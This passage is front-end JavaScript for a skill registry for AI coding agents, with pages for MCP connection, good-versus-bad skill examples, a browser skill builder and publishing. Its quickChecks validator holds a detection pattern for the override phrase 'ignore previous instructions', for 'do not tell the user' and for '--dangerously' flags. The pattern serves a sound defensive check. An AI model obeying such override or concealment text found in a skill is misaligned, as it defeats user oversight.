    try { await api(`/api/orgs/${slug}/tokens/${b.dataset.revoke}`, { method: 'DELETE' }); await renderManage(slug); } catch (err) { alertInline(el, err.message); }
  }));
}

function alertInline(el, msg) {
  const p = document.createElement('p');
  p.className = 'error';
  p.setAttribute('role', 'alert');
  p.textContent = msg;
  el.prepend(p);
}

function viewConnect() {
  const url = `${ORIGIN}/mcp`;
  const tok = '${SKILLYARD_TOKEN}';
  const agents = [
    ['Claude Code', 'Adds Skillyard as a remote MCP server for every project.', `claude mcp add --transport http --scope user skillyard ${url} --header "Authorization: Bearer $SKILLYARD_TOKEN"`],
    ['OpenAI Codex', 'Append to ~/.codex/config.toml.', `[mcp_servers.skillyard]\nurl = "${url}"\nbearer_token_env_var = "SKILLYARD_TOKEN"`],
    ['Cursor', 'Add to .cursor/mcp.json in your project.', JSON.stringify({ mcpServers: { skillyard: { url, headers: { Authorization: 'Bearer ${env:SKILLYARD_TOKEN}' } } } }, null, 2)],
    ['VS Code / Copilot', 'Add to .vscode/mcp.json.', JSON.stringify({ servers: { skillyard: { type: 'http', url, headers: { Authorization: 'Bearer ${env:SKILLYARD_TOKEN}' } } } }, null, 2)],
    ['Gemini CLI', 'Add to ~/.gemini/settings.json.', JSON.stringify({ mcpServers: { skillyard: { httpUrl: url, headers: { Authorization: 'Bearer $SKILLYARD_TOKEN' } } } }, null, 2)],
    ['Claude Desktop & stdio clients', 'Runs a local stdio bridge to this registry.', JSON.stringify({ mcpServers: { skillyard: { command: 'npx', args: ['-y', 'skillyard', 'mcp'], env: { SKILLYARD_REGISTRY: ORIGIN, SKILLYARD_TOKEN: '<your token>' } } } }, null, 2)],
  ];
  void tok;
  app.innerHTML = h`
    <div class="page-head"><h1>Connect an agent</h1><p>Two ways to give an agent your skills. <strong>Install</strong> copies skills into the folder the agent already reads, so they work offline and load automatically. <strong>MCP</strong> lets the agent search the whole registry live and pull a skill when a task calls for it — useful when your company has more skills than you want installed.</p></div>
    <div class="steps">
      <div class="step"><h3>1 · Point the CLI at this registry</h3><p>Private skills need an org token; public ones don't.</p>${raw(cmd(`npx skillyard login --registry ${ORIGIN} --token sy_…`))}</div>
      <div class="step"><h3>2 · Install skills into your agents</h3><p>Detects Claude Code, Codex, Cursor and AGENTS.md in the current project; pick explicitly with <code>--agent</code>.</p>${raw(cmd('npx skillyard install code-review @acme/deploy-runbook --agent claude,codex --save'))}<p style="margin-top:12px">Teammates then run one command to get the same set:</p>${raw(cmd('npx skillyard sync'))}</div>
      <div class="step"><h3>3 · Or connect over MCP</h3><p>The registry is an MCP server at <code>${url}</code> with tools <code>search_skills</code>, <code>get_skill</code> and <code>read_skill_file</code>, and every skill as a prompt. <code>npx skillyard connect &lt;agent&gt; --write</code> sets this up for you.</p></div>
    </div>
    <div class="section-title"><h2>MCP config by agent</h2><span class="muted">export SKILLYARD_TOKEN=sy_… first</span></div>
    <div class="agents-grid">${raw(agents.map(([name, note, snippet]) => h`<div class="panel"><h3>${name}</h3><p class="muted" style="font-size:13px;margin:0 0 8px">${note}</p>${raw(cmd(snippet))}</div>`).join(''))}</div>`;
  copyButtons(app);
}

const CAUGHT = { scan: 'Security scan', validate: 'Format check', eval: 'Lift eval', review: 'Human review' };

function registryLink(p) {
  const m = /registry\/public\/([a-z0-9-]+)$/.exec(p) || /seed\/orgs\/([a-z0-9-]+)\/skills\/([a-z0-9-]+)$/.exec(p);
  if (!m) return null;
  return m[2] ? `#/skill/@${m[1]}/${m[2]}` : `#/skill/@skillyard/${m[1]}`;
}

function codeBlock(side) {
  return `<div class="code-lines">${side.lines.map((l) => `<div class="${l.hit ? 'hit' : ''}"><span class="ln">${l.n}</span><span>${esc(l.text) || ' '}</span></div>`).join('')}${side.truncated ? '<div class="more">…</div>' : ''}</div>`;
}

function verdict(l) {
  const b = l.bad;
  const crit = b.scan.filter((f) => f.severity === 'critical');
  if (crit.length) return ['bad', `Blocked: ${crit[0].message}`];
  if (b.errors.length) return ['bad', `Rejected: ${b.errors[0]}`];
  const warn = [...b.warnings, ...b.scan.map((f) => f.message)];
  if (warn.length) return ['warn', `Warning: ${warn[0]}`];
  if (l.caughtBy.includes('eval')) return ['quiet', 'Passes every static check. Only measuring catches it.'];
  return ['quiet', 'Passes every check. Only a human reviewer catches it.'];
}

async function viewExamples(params) {
  const data = await (await fetch('examples.json')).json();
  const kind = params.get('kind') || '';
  const lessons = data.lessons.filter((l) => !kind || l.kind === kind);
  const pct = (x) => `${Math.round(x * 100)}%`;
  app.innerHTML = h`
    <div class="page-head"><h1>Good skills, bad skills</h1>
    <p>Twelve skills that look reasonable and aren't, each next to a version that works. Every verdict below is the real output of <code>skillyard validate</code>, <code>skillyard scan</code> or <code>skillyard eval</code>, not a description of what they'd say. The bad ones live in <a href="https://github.com/agentwik-labs/skillyard/tree/main/examples/bad">examples/bad</a> so you can test your own tools on them; don't install them.</p></div>
    <div class="chips" role="group" aria-label="Filter">
      ${raw(['', 'security', 'quality'].map((k) => `<button type="button" class="chip ${k === kind ? 'on' : ''}" data-kind="${k}">${k ? k[0].toUpperCase() + k.slice(1) : 'All'} · ${data.lessons.filter((l) => !k || l.kind === k).length}</button>`).join(''))}
    </div>
    ${raw(lessons.map((l, i) => {
      const [vk, vtext] = verdict(l);
      const link = registryLink(l.good.path);
      const m = l.measured;
      return h`<section class="lesson" id="${l.id}">
        <div class="lesson-head">
          <span class="lesson-n">${String(i + 1).padStart(2, '0')}</span>
          <h2>${l.title}</h2>
          <span class="badge ${l.kind === 'security' ? 'private' : 'public'}">${l.kind}</span>
          <span class="muted caught">Caught by: ${l.caughtBy.map((c) => CAUGHT[c]).join(', ')}</span>
        </div>
        <p class="why">${l.why}</p>
        <div class="pair">
          <div class="side bad-side">
            <div class="side-head"><strong>Bad</strong> <span class="mono">${l.bad.name}/${l.bad.file}</span></div>
            <div class="verdict ${vk}">${vtext}</div>
            ${raw(codeBlock(l.bad))}
            ${raw(l.bad.scan.length + l.bad.warnings.length + l.bad.errors.length > 1 ? `<ul class="findings">${[...l.bad.errors.map((e) => ['error', e]), ...l.bad.scan.map((f) => [f.severity, `${f.file}:${f.line} ${f.message}`]), ...l.bad.warnings.map((w) => ['warning', w])].map(([sev, t]) => `<li><span class="sev ${sev}">${sev}</span> ${esc(t)}</li>`).join('')}</ul>` : '')}
          </div>
          <div class="side good-side">
            <div class="side-head"><strong>Good</strong> <span class="mono">${l.good.name}/${l.good.file}</span>${raw(link ? ` <a href="${link}">open in registry →</a>` : '')}</div>
            <div class="verdict ok">${l.good.blocked ? 'Check failed' : `Passes: ${l.good.scan.length ? `${l.good.scan.length} warning(s) to review` : 'format check and security scan clean'}`}</div>
            ${raw(codeBlock(l.good))}
          </div>
        </div>
        ${raw(m ? h`<div class="measured"><strong>Measured</strong> (${m.model}, ${m.runs} runs per condition): no skill ${pct(m.without)} · this bad skill ${pct(m.withBad)}${raw(m.withGood != null ? ` · the good skill ${esc(pct(m.withGood))}` : '')}${raw(m.note ? ` <span class="muted">${esc(m.note)}</span>` : '')}</div>` : '')}
        <p class="fix"><strong>Fix:</strong> ${l.fix}</p>
      </section>`;
    }).join(''))}`;
  app.querySelectorAll('[data-kind]').forEach((b) => b.addEventListener('click', () => { location.hash = b.dataset.kind ? `#/examples?kind=${b.dataset.kind}` : '#/examples'; }));
}

// ---- skill builder (no server needed) -------------------------------------------------

let GEN = null;
const builder = { gen: null, answers: {} };

const CRC = (() => { const t = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; } return t; })();
const crc32 = (b) => { let c = 0xffffffff; for (const x of b) c = CRC[(c ^ x) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
/** A stored (uncompressed) zip: enough for a folder of small text files. */
function zip(files) {
  const enc = new TextEncoder();
  const parts = [];
  const central = [];
  let offset = 0;
  for (const [name, text] of Object.entries(files)) {
    const nb = enc.encode(name);
    const data = enc.encode(text);
    const crc = crc32(data);
    const local = new DataView(new ArrayBuffer(30));
    [[0, 0x04034b50, 4], [4, 20, 2], [6, 0x0800, 2], [8, 0, 2], [10, 0, 2], [12, 0x21, 2], [14, crc, 4], [18, data.length, 4], [22, data.length, 4], [26, nb.length, 2], [28, 0, 2]]
      .forEach(([o, v, n]) => (n === 4 ? local.setUint32(o, v, true) : local.setUint16(o, v, true)));
    parts.push(new Uint8Array(local.buffer), nb, data);
    const c = new DataView(new ArrayBuffer(46));
    [[0, 0x02014b50, 4], [4, 20, 2], [6, 20, 2], [8, 0x0800, 2], [10, 0, 2], [12, 0, 2], [14, 0x21, 2], [16, crc, 4], [20, data.length, 4], [24, data.length, 4], [28, nb.length, 2], [30, 0, 2], [32, 0, 2], [34, 0, 2], [36, 0, 2], [38, 0, 4], [42, offset, 4]]
      .forEach(([o, v, n]) => (n === 4 ? c.setUint32(o, v, true) : c.setUint16(o, v, true)));
    central.push(new Uint8Array(c.buffer), nb);
    offset += 30 + nb.length + data.length;
  }
  const size = central.reduce((a, b) => a + b.length, 0);
  const end = new DataView(new ArrayBuffer(22));
  const count = Object.keys(files).length;
  [[0, 0x06054b50, 4], [8, count, 2], [10, count, 2], [12, size, 4], [16, offset, 4]].forEach(([o, v, n]) => (n === 4 ? end.setUint32(o, v, true) : end.setUint16(o, v, true)));
  return new Blob([...parts, ...central, new Uint8Array(end.buffer)], { type: 'application/zip' });
}

/** The checks a validator would run, in the browser. */
function quickChecks(md) {
  const out = [];
  const m = /^---\n([\s\S]*?)\n---/.exec(md);
  const desc = m && /description:\s*(.*)/.exec(m[1])?.[1];
  if (!desc || desc.length < 60 || !/use (it |this )?(when|for|before|after)|when (the user|someone|asked)/i.test(desc)) out.push('The description should say when to use the skill, with phrases people type.');
  if (/\bTODO\b/.test(md)) out.push('Replace the TODOs.');
  if (md.split('\n').length > 500) out.push('Long skills cost context on every load; move detail to references/.');
  if (/ignore (all )?(previous|prior) instructions|do not tell the user|--dangerously/i.test(md)) out.push('Remove instructions that override the agent or hide things from the user.');
  return out;
}

async function viewCreate(params) {
  GEN ||= await import('./generators.js');
  const g = GEN.GENERATORS.find((x) => x.id === params.get('g'));
  if (builder.gen !== g?.id) Object.assign(builder, { gen: g?.id || null, answers: {} });
  if (!g) {
    app.innerHTML = h`
      <div class="page-head"><h1>Create a skill</h1><p>Turn what your team already knows into a skill every agent follows. Pick the kind of knowledge, answer a few questions, and download a folder that installs into Claude Code, Codex, Cursor and any AGENTS.md agent. Have an SOP or a wiki page already? Skillyard Studio fills these in from the document for you.</p></div>
      <div class="gen-grid">${raw(GEN.GENERATORS.map((x) => `<a class="gen-card" href="#/create?g=${x.id}"><h3>${esc(x.title)}</h3><p>${esc(x.summary)}</p><span class="muted">Generator: <code>${x.id}</code></span></a>`).join(''))}</div>
      <div class="steps" style="margin-top:28px">
        <div class="step"><h3>From the command line</h3><p>Fill a generator from your own document, then test and install it.</p>${raw(cmd('npx skillyard generate decision --from refund-policy.md'))}</div>
      </div>`;
    copyButtons(app);
    return;
  }
  const field = (f) => {
    const v = builder.answers[f.key];
    const val = Array.isArray(v) ? v.join('\n') : v || '';
    const input = f.kind === 'text' ? `<input name="${f.key}" value="${esc(val)}" placeholder="${esc(f.example || '')}">`
      : `<textarea name="${f.key}" rows="${f.kind === 'list' ? 4 : 3}" placeholder="${esc(f.example || (f.kind === 'list' ? 'One per line' : ''))}">${esc(val)}</textarea>`;
    return `<label class="fld"><span>${esc(f.label)}${f.required ? '' : ' <i class="muted">optional</i>'}</span>${f.help ? `<small class="muted">${esc(f.help)}</small>` : ''}${input}</label>`;
  };
  app.innerHTML = h`
    <div class="crumbs"><a href="#/create">Create a skill</a> / ${g.title}</div>
    <div class="page-head"><h1>${g.title}</h1><p>${g.summary}</p></div>
    <div class="builder">
      <form id="bform">${raw(g.fields.map(field).join(''))}</form>
      <div class="bpreview">
        <div class="panel"><h3>Preview</h3><pre class="skillmd" id="bmd"></pre>
          <div id="bnotes"></div>
          <div class="row" style="margin-top:12px"><button class="primary" type="button" id="bzip">Download .zip</button><button type="button" id="bcopy">Copy SKILL.md</button></div>
          <p class="muted" style="font-size:13px;margin:10px 0 0">Unzip into your repo, then <code>npx skillyard install ./${raw('<span id="bname">skill</span>')} --agent all</code>. Your answers never leave this page.</p>
        </div>
      </div>
    </div>`;
  const update = () => {
    const r = GEN.generate(g.id, builder.answers);
    builder.built = r;
    document.getElementById('bmd').textContent = r.files['SKILL.md'];
    document.getElementById('bname').textContent = r.name;
    const notes = [...r.missing.map((m) => `Still needed: ${m}`), ...quickChecks(r.files['SKILL.md'])];
    if (!r.files['evals/evals.json']) notes.push('Add a real request and the checks a good answer must pass, and it ships with a test.');
    document.getElementById('bnotes').innerHTML = notes.length ? `<ul class="bnotes">${notes.map((n) => `<li>${esc(n)}</li>`).join('')}</ul>` : '<p class="bok">Passes the format checks and ships with a test.</p>';
    document.getElementById('bzip').disabled = r.missing.length > 0;
  };
  document.getElementById('bform').addEventListener('input', (e) => {
    const f = g.fields.find((x) => x.key === e.target.name);
    if (f) builder.answers[f.key] = f.kind === 'list' ? e.target.value.split('\n') : e.target.value;
    update();
  });
  document.getElementById('bzip').addEventListener('click', () => {
    const r = builder.built;
    const files = Object.fromEntries(Object.entries(r.files).map(([k, v]) => [`${r.name}/${k}`, v]));
    const a = document.createElement('a');
    a.href = URL.createObjectURL(zip(files));
    a.download = `${r.name}.zip`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 2000);
  });
  document.getElementById('bcopy').addEventListener('click', async (e) => {
    try { await navigator.clipboard.writeText(builder.built.files['SKILL.md']); e.target.textContent = 'Copied'; } catch { e.target.textContent = 'Select and copy'; }
    setTimeout(() => { e.target.textContent = 'Copy SKILL.md'; }, 1400);
  });
  update();
}

function viewPublish() {
  if (STATIC) {
    app.innerHTML = h`<div class="page-head"><h1>Publish a skill</h1><p>This is a read-only demo. Publishing needs a running registry: <code>npx skillyard serve</code>, or see the README on GitHub.</p></div>${raw(cmd('git clone https://github.com/agentwik-labs/skillyard && cd skillyard && npm run dev'))}`;
    copyButtons(app);
    return;
  }
  const canPublish = me.admin || me.scopes?.includes('publish');
  app.innerHTML = h`
    <div class="page-head"><h1>Publish a skill</h1><p>A skill is a folder with a <code>SKILL.md</code> (YAML frontmatter with <code>name</code> and <code>description</code>, then instructions) and optional <code>scripts/</code>, <code>references/</code> and <code>templates/</code>. Add a <code>skill.json</code> for version, category and tags. Versions are immutable: bump <code>version</code> to publish a change.</p></div>
    <div class="steps">
      <div class="step"><h3>From the CLI</h3>${raw(cmd('npx skillyard new my-skill'))}<p style="margin-top:12px"></p>${raw(cmd('npx skillyard validate my-skill && npx skillyard publish my-skill --org acme --visibility private'))}</div>
      <div class="step"><h3>From this page</h3>
        ${raw(canPublish ? h`<p>Choose a skill folder. It is validated by the server and published under <strong>@${me.org || '…'}</strong>.</p>
        <form id="upload" class="row">
          ${raw(me.admin ? '<input name="org" placeholder="org slug" required style="max-width:180px">' : '')}
          <input type="file" name="dir" webkitdirectory multiple required style="max-width:340px">
          <select name="visibility" style="max-width:160px"><option value="">Visibility from skill.json</option><option value="private">Private</option><option value="public">Public</option></select>
          <button class="primary">Publish</button>
        </form><div id="upload-out"></div>` : '<p class="muted">Sign in with a token that has the <code>publish</code> scope to upload from the browser.</p>')}
      </div>
    </div>`;
  const form = document.getElementById('upload');
  if (!form) return;
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const out = document.getElementById('upload-out');
    const fd = new FormData(form);
    const list = [...form.dir.files];
    if (!list.length) return;
    const root = list[0].webkitRelativePath.split('/')[0];
    const files = {};
    for (const f of list) {
      const rel = f.webkitRelativePath.slice(root.length + 1);
      if (!rel || rel.split('/').some((p) => p.startsWith('.') || p === 'node_modules' || p === '__pycache__')) continue;
      const buf = new Uint8Array(await f.arrayBuffer());
      let bin = '';
      for (let i = 0; i < buf.length; i += 0x8000) bin += String.fromCharCode(...buf.subarray(i, i + 0x8000));
      files[rel] = btoa(bin);
    }
    try {
      const r = await api(`/api/skills/@${me.admin ? fd.get('org') : me.org}`, { method: 'POST', body: { files, visibility: fd.get('visibility') || undefined } });
      out.innerHTML = `<div class="notice">Published <a href="#/skill/${esc(r.id)}">${esc(r.id)}@${esc(r.latest)}</a> (${esc(r.visibility)}).${r.warnings?.length ? `<br>Warnings: ${r.warnings.map(esc).join('; ')}` : ''}</div>`;
    } catch (err) { out.innerHTML = `<p class="error" role="alert">${esc(err.message)}</p>`; }
  });
}

// ---- router ------------------------------------------------------------------

async function route() {
  const hash = location.hash.slice(1) || '/';
  const [pathPart, query = ''] = hash.split('?');
  const params = new URLSearchParams(query);
  const want = (pathPart === '/' || pathPart === '') && params.get('s');
  if (want === 'teams') { location.hash = '#/teams'; return; } // old links: teams moved to its own inquiry page
  if (want && app.querySelector('[data-home]')) { document.getElementById(want)?.scrollIntoView({ behavior: matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth' }); return; }
  document.querySelectorAll('.top nav a').forEach((a) => {
    const target = a.getAttribute('href').slice(1);
    a.classList.toggle('on', target === '/' ? pathPart === '/' : target === '/browse' ? pathPart.startsWith('/browse') || pathPart.startsWith('/skill') : pathPart.startsWith(target));
  });
  document.body.classList.remove('is-landing');
  try {
    let m;
    if ((m = /^\/skill\/(@[a-z0-9-]+\/[a-z0-9-]+)(?:\/file\/(.+))?$/.exec(pathPart))) await viewSkill(m[1], m[2] && decodeURIComponent(m[2]));
    else if (pathPart === '/orgs') await viewOrgs();
    else if ((m = /^\/orgs\/([a-z0-9-]+)$/.exec(pathPart))) await viewOrg(m[1]);
    else if (pathPart === '/connect') viewConnect();
    else if (pathPart === '/publish') viewPublish();
    else if (pathPart === '/teams') viewTeams(params);
    else if (pathPart === '/create') await viewCreate(params);
    else if (pathPart === '/examples') await viewExamples(params);
    else if (pathPart === '/browse') await viewBrowse(params);
    else await viewShowcase();
    document.body.classList.toggle('is-landing', pathPart === '/' || pathPart === '' || pathPart === '/teams');
    document.title = `${document.querySelector('main h1')?.textContent?.slice(0, 60) || 'Skillyard'} · Skillyard`;
    if (pathPart === '/') document.title = 'Skillyard';
  } catch (e) {
    app.innerHTML = h`<div class="empty"><strong>${e.status === 404 ? 'Not found' : 'Something went wrong'}</strong><p>${e.message}</p>${raw(e.status === 404 && me.anonymous ? '<p>If this is a private skill, sign in with your org token.</p>' : '')}<p><a href="#/">Back to all skills</a></p></div>`;
  }
  if (want) document.getElementById(want)?.scrollIntoView();
  else if (!location.hash.includes('/file/')) window.scrollTo(0, 0);
}

document.getElementById('auth').addEventListener('click', async () => {
  if (!me.anonymous) {
    token = null;
    store.set('skillyard.token', null);
    await refreshMe();
    return route();
  }
  document.getElementById('login-error').textContent = '';
  document.getElementById('login').showModal();
});

document.getElementById('login').addEventListener('close', async (e) => {
  const dlg = e.target;
  if (dlg.returnValue !== 'ok') return;
  const value = document.getElementById('token-input').value.trim();
  const prev = token;
  token = value;
  try {
    const who = await api('/api/whoami');
    if (who.anonymous) throw new Error('token not recognized');
    store.set('skillyard.token', value);
    document.getElementById('token-input').value = '';
    await refreshMe();
    route();
  } catch (err) {
    token = prev;
    document.getElementById('login-error').textContent = err.status === 401 ? 'That token is not valid for this registry.' : err.message;
    dlg.returnValue = '';
    dlg.showModal();
  }
});

if (!STATIC) document.getElementById('studio-link')?.remove();
if (STATIC) {
  document.querySelector('#login .muted').innerHTML = 'This is a static demo with two fictional companies. Type <code>acme</code> or <code>northwind</code> to see their private skills.';
  document.getElementById('token-input').placeholder = 'acme';
}
window.addEventListener('hashchange', route);
refreshMe().then(route);
